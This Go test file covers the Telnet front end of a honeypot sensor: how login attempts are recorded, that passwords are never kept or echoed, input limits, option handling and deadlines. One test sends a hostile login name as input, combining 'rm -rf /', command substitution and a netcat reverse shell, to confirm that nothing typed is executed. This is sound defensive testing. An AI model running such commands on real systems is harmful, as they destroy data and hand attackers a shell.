// SPDX-FileCopyrightText: The Nyktus Authors
// SPDX-License-Identifier: AGPL-3.0-or-later

package telnet_test

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/netip"
	"strings"
	"sync"
	"testing"
	"time"

	"nyktus.org/nyktus/sensor/internal/clock/clocktest"
	"nyktus.org/nyktus/sensor/internal/session"
	"nyktus.org/nyktus/sensor/internal/telnet"
)

// scriptConn is a connection whose client has sent everything in advance: the
// server reads the script and then finds the end of the stream. It records
// what the server writes and the deadlines it sets.
type scriptConn struct {
	mu             sync.Mutex
	input          *bytes.Reader
	read           int
	output         bytes.Buffer
	readDeadlines  []time.Time
	writeDeadlines []time.Time
	failWrites     bool
}

func newScriptConn(script string) *scriptConn {
	return &scriptConn{input: bytes.NewReader([]byte(script))}
}

func (c *scriptConn) Read(p []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	n, err := c.input.Read(p)
	c.read += n
	return n, err
}

func (c *scriptConn) Write(p []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.failWrites {
		return 0, errors.New("write failed")
	}
	return c.output.Write(p)
}

func (c *scriptConn) SetReadDeadline(t time.Time) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.readDeadlines = append(c.readDeadlines, t)
	return nil
}

func (c *scriptConn) SetWriteDeadline(t time.Time) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.writeDeadlines = append(c.writeDeadlines, t)
	return nil
}

func (c *scriptConn) SetDeadline(time.Time) error { return nil }
func (c *scriptConn) Close() error                { return nil }
func (c *scriptConn) LocalAddr() net.Addr         { return &net.TCPAddr{} }
func (c *scriptConn) RemoteAddr() net.Addr        { return &net.TCPAddr{} }

func (c *scriptConn) written() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.output.String()
}

const (
	secretValue = "Abcdefghijklmnopqrstuvwxyz0123456789-_ABCDE"
	opening     = "\xff\xfb\x01\xff\xfb\x03" // IAC WILL ECHO, IAC WILL SGA
)

var defaultConfig = telnet.Config{Banner: "\r\nTest banner\r\n", LoginPrompt: "login: "}

// play runs the honeypot against a client that sends script and returns the
// finished session and the connection.
func play(t *testing.T, cfg telnet.Config, script string) (*session.Session, *scriptConn) {
	t.Helper()
	clk := clocktest.New()
	conn := newScriptConn(script)
	hp := &session.Honeypot{ID: "7d2a51c4-3b8e-4f0a-9c6d-1e2f3a4b5c6d", Service: "telnet", Secret: secretValue}
	s, err := session.Start(clk, hp, netip.MustParseAddrPort("203.0.113.9:51000"), netip.MustParseAddrPort("10.0.0.5:23"))
	if err != nil {
		t.Fatal(err)
	}
	telnet.New(cfg, clk).Serve(t.Context(), conn, s)
	s.End()
	return s, conn
}

// attempts returns the logins of the session as (username, password length)
// pairs, with -1 for a login without a password.
func attempts(t *testing.T, s *session.Session) []struct {
	user string
	pass int
} {
	t.Helper()
	rep, ok := s.Report(0)
	if !ok {
		t.Fatal("Report() = not ok")
	}
	var out []struct {
		user string
		pass int
	}
	for _, a := range rep.Attempts {
		n := -1
		if a.PasswordLength != nil {
			n = *a.PasswordLength
		}
		out = append(out, struct {
			user string
			pass int
		}{a.Username, n})
	}
	return out
}

func TestServe_Login_RecordsTheUserAndTheLengthOfThePassword(t *testing.T) {
	t.Parallel()

	s, conn := play(t, defaultConfig, "root\r\nhunter2\r\n")

	got := attempts(t, s)
	if len(got) != 1 || got[0].user != "root" || got[0].pass != 7 {
		t.Errorf("attempts = %+v, want root with a password of 7 bytes", got)
	}
	want := opening + "\r\nTest banner\r\n" + "login: " + "root" + "\r\n" + "Password: " + "\r\nLogin incorrect\r\n" + "login: "
	if out := conn.written(); out != want {
		t.Errorf("written = %q, want %q", out, want)
	}
}

// A password is not kept: not in the session, not in the report and not
// shown back to the client.
func TestServe_Password_IsNeverKeptOrEchoed(t *testing.T) {
	t.Parallel()

	s, conn := play(t, defaultConfig, "root\r\nhunter2-typed-this\r\n")

	rep, _ := s.Report(0)
	body, err := json.Marshal(rep)
	if err != nil {
		t.Fatal(err)
	}
	for name, out := range map[string]string{"report": string(body), "written": conn.written()} {
		if strings.Contains(out, "hunter2") {
			t.Errorf("%s holds the password: %s", name, out)
		}
	}
}

func TestServe_Login_ShowsOnlyThePromptsAndTheTypedName(t *testing.T) {
	t.Parallel()

	// Nothing the client sends is run, answered or passed on: the output is
	// the texts of the honeypot and, as a Telnet server does, the name typed
	// back to the client.
	_, conn := play(t, defaultConfig, "; rm -rf / `id` $(id)\r\n| nc 203.0.113.9 1 -e /bin/sh\r\n")

	want := opening + "\r\nTest banner\r\n" + "login: " + "; rm -rf / `id` $(id)" + "\r\n" + "Password: " + "\r\nLogin incorrect\r\n" + "login: "
	if out := conn.written(); out != want {
		t.Errorf("written = %q, want %q", out, want)
	}
}

func TestServe_EndOfTheStream(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
		want   []struct {
			user string
			pass int
		}
	}{
		{name: "nothing typed", script: ""},
		{name: "a name that was not entered", script: "roo"},
		{name: "a name without a password", script: "root\r\n", want: []struct {
			user string
			pass int
		}{{"root", -1}}},
		{name: "an empty password", script: "root\r\n\r\n", want: []struct {
			user string
			pass int
		}{{"root", 0}}},
		{name: "a password that was not entered", script: "root\r\nabc", want: []struct {
			user string
			pass int
		}{{"root", 3}}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s, _ := play(t, defaultConfig, tt.script)
			got := attempts(t, s)
			if len(got) != len(tt.want) {
				t.Fatalf("attempts = %+v, want %+v", got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("attempts[%d] = %+v, want %+v", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestServe_SevenLogins_OffersSixAndEnds(t *testing.T) {
	t.Parallel()

	script := strings.Repeat("root\r\nwrong\r\n", 7)
	s, conn := play(t, defaultConfig, script)

	if got := len(attempts(t, s)); got != 6 {
		t.Errorf("recorded %d logins, want 6", got)
	}
	out := conn.written()
	if got := strings.Count(out, "login: "); got != 6 {
		t.Errorf("the login was offered %d times, want 6", got)
	}
	if got := strings.Count(out, "Login incorrect"); got != 6 {
		t.Errorf("%d refusals, want 6", got)
	}
	if !strings.HasSuffix(out, "Login incorrect\r\n") {
		t.Errorf("written ends with %q, want the last refusal and no further prompt", out[max(0, len(out)-30):])
	}
}

func TestServe_EmptyNames_AskAgainAndCountAsRounds(t *testing.T) {
	t.Parallel()

	s, conn := play(t, defaultConfig, strings.Repeat("\r\n", 10))

	if got := attempts(t, s); len(got) != 0 {
		t.Errorf("attempts = %+v, want none: an empty name is no login", got)
	}
	if got := strings.Count(conn.written(), "login: "); got != 6 {
		t.Errorf("the login was offered %d times, want 6: empty names use up the rounds", got)
	}
}

func TestServe_LineEndings(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{name: "carriage return and line feed", script: "root\r\nab\r\n"},
		{name: "carriage return and NUL", script: "root\r\x00ab\r\x00"},
		{name: "line feed alone", script: "root\nab\n"},
		{name: "carriage return alone", script: "root\rab\r"},
		{name: "NUL inside a line", script: "ro\x00ot\r\na\x00b\r\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s, _ := play(t, defaultConfig, tt.script)
			got := attempts(t, s)
			if len(got) != 1 || got[0].user != "root" || got[0].pass != 2 {
				t.Errorf("attempts = %+v, want root with a password of 2 bytes", got)
			}
		})
	}
}

func TestServe_Commands_AreNotData(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
		user   string
	}{
		{name: "negotiation inside the name", script: "ro\xff\xfd\x01ot\r\npw\r\n", user: "root"},
		{name: "subnegotiation inside the name", script: "ro\xff\xfa\x18\x00xterm\xff\xf0ot\r\npw\r\n", user: "root"},
		{name: "a command without an option", script: "ro\xff\xf1ot\r\npw\r\n", user: "root"},
		{name: "an escaped 255 is data", script: "a\xff\xffb\r\npw\r\n", user: "a\xffb"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s, _ := play(t, defaultConfig, tt.script)
			got := attempts(t, s)
			if len(got) != 1 || got[0].user != tt.user || got[0].pass != 2 {
				t.Errorf("attempts = %+v, want %q with a password of 2 bytes", got, tt.user)
			}
		})
	}
}

// The server writes what its own script says. A client cannot make it write
// more than it reads by negotiating options.
func TestServe_Negotiations_AreNotAnswered(t *testing.T) {
	t.Parallel()

	_, conn := play(t, defaultConfig, strings.Repeat("\xff\xfd\x01\xff\xfb\x18\xff\xfe\x03", 1000))

	want := opening + "\r\nTest banner\r\n" + "login: "
	if out := conn.written(); out != want {
		t.Errorf("written = %q, want only the opening, the banner and the prompt", out)
	}
}

func TestServe_SubnegotiationLongerThanAnyRealOne_EndsTheSession(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		length int
		ends   bool
	}{
		{name: "128 bytes", length: 128},
		{name: "129 bytes", length: 129, ends: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s, _ := play(t, defaultConfig, "\xff\xfa\x18"+strings.Repeat("x", tt.length-1)+"\xff\xf0root\r\npw\r\n")
			got := attempts(t, s)
			if ended := len(got) == 0; ended != tt.ends {
				t.Errorf("attempts = %+v, want the session ended = %v", got, tt.ends)
			}
		})
	}
}

func TestServe_MoreThan16KiB_EndsTheSession(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{name: "a line without an end", script: strings.Repeat("a", 64<<10)},
		{name: "commands", script: strings.Repeat("\xff\xfd\x01", 64<<10/3)},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			_, conn := play(t, defaultConfig, tt.script)
			if conn.read > 16<<10 {
				t.Errorf("read %d bytes, want at most 16384", conn.read)
			}
			if conn.read < 16<<10 {
				t.Errorf("read %d bytes, want the whole allowance to be used before the end", conn.read)
			}
		})
	}
}

// The budget covers the whole connection: what the first line used is not
// available to the second.
func TestServe_LongPassword_IsCutByTheBudgetOfTheConnection(t *testing.T) {
	t.Parallel()

	s, _ := play(t, defaultConfig, "root\r\n"+strings.Repeat("p", 20<<10)+"\r\nroot\r\npw\r\n")

	got := attempts(t, s)
	if len(got) != 1 || got[0].pass != 16<<10-len("root\r\n") {
		t.Errorf("attempts = %+v, want one login whose password is cut by the budget", got)
	}
}

func TestServe_LongUsername_KeepsTheFirst256BytesAndCountsNoMore(t *testing.T) {
	t.Parallel()

	s, _ := play(t, defaultConfig, strings.Repeat("u", 300)+"\r\npw\r\n")

	got := attempts(t, s)
	if len(got) != 1 || len(got[0].user) != 256 || got[0].pass != 2 {
		t.Errorf("attempts = %+v, want a name of 256 bytes", got)
	}
}

func TestServe_Echo_ShowsPrintableBytesOnly(t *testing.T) {
	t.Parallel()

	_, conn := play(t, defaultConfig, "ro\x01\x1b[2Jot\r\n")

	out := strings.TrimPrefix(conn.written(), opening+"\r\nTest banner\r\n")
	if strings.ContainsAny(out, "\x01\x1b") {
		t.Errorf("written = %q, want no control characters echoed", out)
	}
}

func TestServe_Config_ChangesTheTexts(t *testing.T) {
	t.Parallel()

	_, conn := play(t, telnet.Config{Banner: "User Access Verification\r\n\r\n", LoginPrompt: "Username: "}, "")

	want := opening + "User Access Verification\r\n\r\n" + "Username: "
	if out := conn.written(); out != want {
		t.Errorf("written = %q, want %q", out, want)
	}
}

func TestServe_Defaults_AreTheTextsOfARealServer(t *testing.T) {
	t.Parallel()

	if telnet.DefaultBanner != "\r\nUbuntu 22.04.4 LTS\r\n" || telnet.DefaultLoginPrompt != "login: " {
		t.Errorf("defaults = %q, %q", telnet.DefaultBanner, telnet.DefaultLoginPrompt)
	}
}

func TestServe_CanceledContext_OffersNoLogin(t *testing.T) {
	t.Parallel()

	clk := clocktest.New()
	conn := newScriptConn("root\r\npw\r\n")
	hp := &session.Honeypot{ID: "7d2a51c4-3b8e-4f0a-9c6d-1e2f3a4b5c6d", Service: "telnet"}
	s, err := session.Start(clk, hp, netip.MustParseAddrPort("203.0.113.9:1"), netip.MustParseAddrPort("10.0.0.5:23"))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	telnet.New(defaultConfig, clk).Serve(ctx, conn, s)

	if out := conn.written(); strings.Contains(out, "login: ") {
		t.Errorf("written = %q, want no prompt after the end of the sensor", out)
	}
}

func TestServe_FailingWrite_EndsWithoutReading(t *testing.T) {
	t.Parallel()

	clk := clocktest.New()
	conn := newScriptConn("root\r\npw\r\n")
	conn.failWrites = true
	hp := &session.Honeypot{ID: "7d2a51c4-3b8e-4f0a-9c6d-1e2f3a4b5c6d", Service: "telnet"}
	s, err := session.Start(clk, hp, netip.MustParseAddrPort("203.0.113.9:1"), netip.MustParseAddrPort("10.0.0.5:23"))
	if err != nil {
		t.Fatal(err)
	}
	telnet.New(defaultConfig, clk).Serve(t.Context(), conn, s)

	if conn.read != 0 || s.Attempts() != 0 {
		t.Errorf("read %d bytes and recorded %d logins after a failing write, want none", conn.read, s.Attempts())
	}
}

// A silent client is given 30 seconds, and a client that does not read 10
// seconds. The deadlines are set from the clock of the sensor with every read
// and write.
func TestServe_Deadlines_AreThirtySecondsToReadAndTenToWrite(t *testing.T) {
	t.Parallel()

	clk := clocktest.New()
	conn := newScriptConn("root\r\npw\r\n")
	hp := &session.Honeypot{ID: "7d2a51c4-3b8e-4f0a-9c6d-1e2f3a4b5c6d", Service: "telnet"}
	s, err := session.Start(clk, hp, netip.MustParseAddrPort("203.0.113.9:1"), netip.MustParseAddrPort("10.0.0.5:23"))
	if err != nil {
		t.Fatal(err)
	}
	telnet.New(defaultConfig, clk).Serve(t.Context(), conn, s)

	if len(conn.readDeadlines) == 0 || len(conn.writeDeadlines) == 0 {
		t.Fatalf("deadlines set: %d for reads, %d for writes", len(conn.readDeadlines), len(conn.writeDeadlines))
	}
	for _, d := range conn.readDeadlines {
		if want := clk.Deadline(30 * time.Second); !d.Equal(want) {
			t.Errorf("read deadline = %v, want %v", d, want)
		}
	}
	for _, d := range conn.writeDeadlines {
		if want := clk.Deadline(10 * time.Second); !d.Equal(want) {
			t.Errorf("write deadline = %v, want %v", d, want)
		}
	}
}

// A client that is silent is not given more time by the time it has used: the
// deadline follows every read.
func TestServe_Deadlines_FollowTheClock(t *testing.T) {
	t.Parallel()

	clk := clocktest.New()
	conn := &advancingConn{scriptConn: newScriptConn("root\r\npw\r\n"), clk: clk}
	hp := &session.Honeypot{ID: "7d2a51c4-3b8e-4f0a-9c6d-1e2f3a4b5c6d", Service: "telnet"}
	s, err := session.Start(clk, hp, netip.MustParseAddrPort("203.0.113.9:1"), netip.MustParseAddrPort("10.0.0.5:23"))
	if err != nil {
		t.Fatal(err)
	}
	telnet.New(defaultConfig, clk).Serve(t.Context(), conn, s)

	for i := 1; i < len(conn.readDeadlines); i++ {
		if !conn.readDeadlines[i].After(conn.readDeadlines[i-1]) {
			t.Errorf("read deadline %d = %v, not after %v: the idle time starts again with every read", i, conn.readDeadlines[i], conn.readDeadlines[i-1])
		}
	}
}

// advancingConn lets a second pass before every read.
type advancingConn struct {
	*scriptConn
	clk *clocktest.Fake
}

func (c *advancingConn) Read(p []byte) (int, error) {
	c.clk.Advance(time.Second)
	return c.scriptConn.Read(p)
}

var _ io.Reader = (*scriptConn)(nil)
